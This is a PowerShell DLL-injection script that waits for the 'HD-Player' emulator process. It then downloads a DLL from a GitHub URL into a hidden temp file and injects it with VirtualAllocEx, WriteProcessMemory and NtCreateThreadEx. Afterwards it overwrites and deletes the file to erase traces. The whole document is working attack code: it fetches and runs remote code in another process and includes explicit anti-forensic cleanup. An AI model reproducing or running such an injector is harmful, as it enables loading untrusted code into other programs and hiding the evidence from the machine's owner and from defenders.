# WinAPI bindings
$signature = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes,
                                               IntPtr processHandle, IntPtr startAddress, IntPtr parameter, 
                                               bool createSuspended, int zeroBits, int stackSize, int maximumStackSize, IntPtr attributeList);
}
"@
Add-Type -TypeDefinition $signature -PassThru

function Get-ProcessIdByName($name) {
    $proc = Get-Process | Where-Object { $_.ProcessName -like $name }
    return $proc.Id
}

$dllUrl = "https://raw.githubusercontent.com/Shreyasglitch/ps/main/test.dll"
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

while ($true) {
    $pid = Get-ProcessIdByName "HD-Player"
    if ($pid) {
        Write-Host "[+] HD-Player found (PID: $pid)"
        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)

        if ($hProcess -ne 0) {
            $webclient = New-Object System.Net.WebClient
            $dllBytes = $webclient.DownloadData($dllUrl)

            # Create temp file, hidden
            $tempPath = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetRandomFileName() + ".dll")
            [System.IO.File]::WriteAllBytes($tempPath, $dllBytes)
            (Get-Item $tempPath).Attributes = "Hidden"

            # Encode path to null-terminated byte[]
            $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath + [char]0)

            # Allocate memory in remote process
            $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllPathBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

            if ($allocMem -ne 0) {
                # Write path to remote process
                [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, $dllPathBytes.Length, [ref]0)

                $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
                $loadLibrary = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

                [IntPtr]$hThread = [IntPtr]::Zero
                $result = [Win32]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $loadLibrary, $allocMem, $false, 0, 0, 0, [IntPtr]::Zero)

                if ($result -eq 0) {
                    Write-Host "[+] Injected successfully ✅"

                    # 🧽 Clean trace
                    Start-Sleep -Milliseconds 300  # wait a bit for safety
                    [System.IO.File]::WriteAllText($tempPath, "0")  # Overwrite file content
                    Remove-Item $tempPath -Force  # Delete DLL
                } else {
                    Write-Host "[-] Injection failed ❌ Code: $result"
                }
            }
        }
    }
    Start-Sleep -Seconds 5
}
